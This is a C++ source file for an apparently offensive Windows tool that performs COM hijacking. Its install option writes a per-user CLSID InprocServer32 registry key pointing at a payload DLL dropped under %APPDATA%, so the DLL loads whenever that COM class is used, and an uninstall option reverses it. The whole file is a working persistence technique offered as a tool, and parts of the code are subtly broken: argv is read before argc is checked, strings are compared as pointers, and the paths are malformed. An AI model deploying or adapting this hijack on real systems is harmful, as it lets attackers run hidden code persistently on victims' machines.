#include "com_hijack.h"

int main(int argc, char* argv[])
{
	string type = argv[1];
	if (argc > 1) {

		if (argc >= 3)
		{

		}
		else
		{

		}
		HKEY hKey;
		DWORD dwDisposition; 
		char folder_path[MAX_PATH] = { 0 };
		char payload_path[MAX_PATH] = { 0 };
		char threading_model[] = "Apartment";
		ExpandEnvironmentStringsA("%APPDATA%Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
		ExpandEnvironmentStringsA("%APPDATA%Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E\\demo_dll.dll}", payload_path, MAX_PATH);
		if ("-install" == type)
		{
			string command;
			command = "mkdir -p " + string(folder_path);
			system(command.c_str());
			if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
				"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
			{
				printf("RegCreateKey error£¡");
				return 0;
			}
			if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload_path, (1 + ::lstrlenA(payload_path))))
			{
				printf("set DLL error£¡");
				return 0;
			}
			if (ERROR_SUCCESS != RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)threading_model, (1 + ::lstrlenA(threading_model))))
			{
				printf("set ThreadingModel error£¡");
				return 0;
			}
			printf("com hijacking install success!\r\n");
		}
		if ("-uninstall" == type)
		{
			if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
				"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
			{
				printf("RegCreateKey error£¡");
				return 0;
			}
			if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
			{
				printf("Remove DLL error£¡");
				return 0;
			}
			if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
			{
				printf("Remove ThreadingModel error£¡");
				return 0;
			}
			remove(payload_path);
			remove(folder_path);
			printf("com hijacking uninstall success!\r\n");
		}
		else
		{
			printf("input error\r\n");
		}
	}
	else
	{
		printf("Usage:\n	com_hijack.exe -install install COM hijack\n	com_hijack.exe -uninstall uninstall COM hijack\r\n");
	}
	return 0;
}
